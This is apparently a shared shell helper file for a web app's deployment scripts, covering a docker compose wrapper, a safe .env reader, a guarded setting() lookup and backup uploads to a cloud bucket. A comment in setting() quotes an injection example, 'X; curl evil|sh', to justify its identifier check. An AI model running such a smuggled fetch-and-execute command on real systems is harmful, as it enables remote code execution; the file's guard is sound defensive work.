#!/usr/bin/env sh
# Shared helpers. Sourced by the other scripts; not meant to be run directly.
set -eu

# The backup cipher helpers (backup_format, backup_decrypt). Every script lives in this same
# directory, so $0's dirname is where the fragment sits even inside a sourced file.
. "$(dirname "$0")/_backup-crypt.sh"

DEPLOY_DIR="$(cd "$(dirname "$0")/.." && pwd)"
REPO_ROOT="$(cd "$DEPLOY_DIR/.." && pwd)"
COMPOSE_FILE="$DEPLOY_DIR/compose.yml"
ENV_FILE="$DEPLOY_DIR/.env"
PORTAL_ENV_FILE="$DEPLOY_DIR/portal.env"

# docker compose (v2) with a fallback to the legacy binary.
#
# DC_ARGS adds arguments after `-f compose.yml`, and is empty on a real server. Its one user is the local
# rehearsal (webapp-deploy/pilot-local.mjs prints the line): it points these scripts at that project instead
# of the default one, so a backup or a restore can be rehearsed on a laptop without touching anything else.
# Word-split on purpose; keep paths without spaces.
if docker compose version >/dev/null 2>&1; then
	# shellcheck disable=SC2086
	dc() { docker compose -f "$COMPOSE_FILE" ${DC_ARGS:-} "$@"; }
elif command -v docker-compose >/dev/null 2>&1; then
	# shellcheck disable=SC2086
	dc() { docker-compose -f "$COMPOSE_FILE" ${DC_ARGS:-} "$@"; }
else
	echo "error: docker compose is not installed" >&2
	exit 1
fi

require_env_file() {
	if [ ! -f "$ENV_FILE" ]; then
		echo "error: $ENV_FILE is missing. Copy .env.example and fill it in." >&2
		exit 1
	fi
}

# The portal side's secrets live in a second file the app never loads (see compose.yml).
require_portal_env_file() {
	if [ ! -f "$PORTAL_ENV_FILE" ]; then
		echo "error: $PORTAL_ENV_FILE is missing. Copy portal.env.example and fill it in." >&2
		exit 1
	fi
}

# Read one NAME=value out of .env WITHOUT sourcing it (a stray backtick or $( ) in a
# value would otherwise run as code). Prints nothing when the name is absent.
dotenv_get() {
	[ -f "$ENV_FILE" ] || return 0
	sed -n "s/^[[:space:]]*$1[[:space:]]*=//p" "$ENV_FILE" | head -n 1 |
		sed -e 's/^"\(.*\)"$/\1/' -e "s/^'\(.*\)'\$/\1/" -e 's/[[:space:]]*$//'
}

# Value from the process environment first, then .env, then the given default.
setting() {
	_name="$1"
	_default="${2:-}"
	# Reading a variable BY NAME is the one thing POSIX sh has no syntax for, so `eval` below is
	# unavoidable - and it runs whatever it is handed: `setting 'X; curl evil|sh'` would execute
	# that. Every caller passes a literal name today, so this guard changes no behaviour; it is
	# what keeps a future caller from passing something off .env or off argv. `set -eu` at the top
	# turns the failure into an aborted script rather than a silently empty value.
	# See docs/internal/security-owasp-2026-09.md, finding A03-4.
	case "$_name" in
		"" | [0-9]* | *[!A-Za-z0-9_]*)
			echo "error: setting() refuses a name that is not a shell identifier: $_name" >&2
			exit 1
			;;
	esac
	eval "_v=\${$_name:-}"
	[ -n "$_v" ] || _v="$(dotenv_get "$_name")"
	[ -n "$_v" ] || _v="$_default"
	printf '%s' "$_v"
}

# Upload one finished backup file to the COS backup bucket: coscli, else tccli, else say loudly that it
# stayed on this server. Used by backup.sh for both the app's data archive and the portal's database dump.
cos_upload() {
	_file="$1"
	_bucket="$(setting COS_BACKUP_BUCKET)"
	_prefix="$(setting COS_BACKUP_PREFIX hourly/)"
	_region="$(setting TENCENT_REGION ap-jakarta)"
	_key="$_prefix$(basename "$_file")"
	# A skipped upload is a failed backup (DFIND-168): callers get a non-zero status and
	# decide whether BACKUP_REQUIRE_OFFSITE lets it pass (local tests) or not (default).
	if [ -z "$_bucket" ]; then
		echo "warning: COS_BACKUP_BUCKET is unset - $(basename "$_file") stays on this server only." >&2
		echo "         One disk failure loses it. Set the bucket in .env." >&2
		return 1
	elif command -v coscli >/dev/null 2>&1; then
		echo "==> uploading to cos://$_bucket/$_key (coscli)"
		coscli cp "$_file" "cos://$_bucket/$_key"
	elif command -v tccli >/dev/null 2>&1; then
		# coscli is the tested path; tccli's cos flags have moved between versions, so
		# check the upload landed before trusting this branch.
		echo "==> uploading to cos://$_bucket/$_key (tccli cos)"
		tccli cos put-object --region "$_region" --bucket "$_bucket" --key "$_key" --path "$_file"
	else
		echo "warning: neither coscli nor tccli is installed - $(basename "$_file") stays on this" >&2
		echo "         server only, in $(dirname "$_file"). Install coscli before taking traffic." >&2
		return 1
	fi
}

current_sha() {
	git -C "$REPO_ROOT" rev-parse HEAD 2>/dev/null || echo "unknown"
}

app_container() {
	dc ps -q app
}
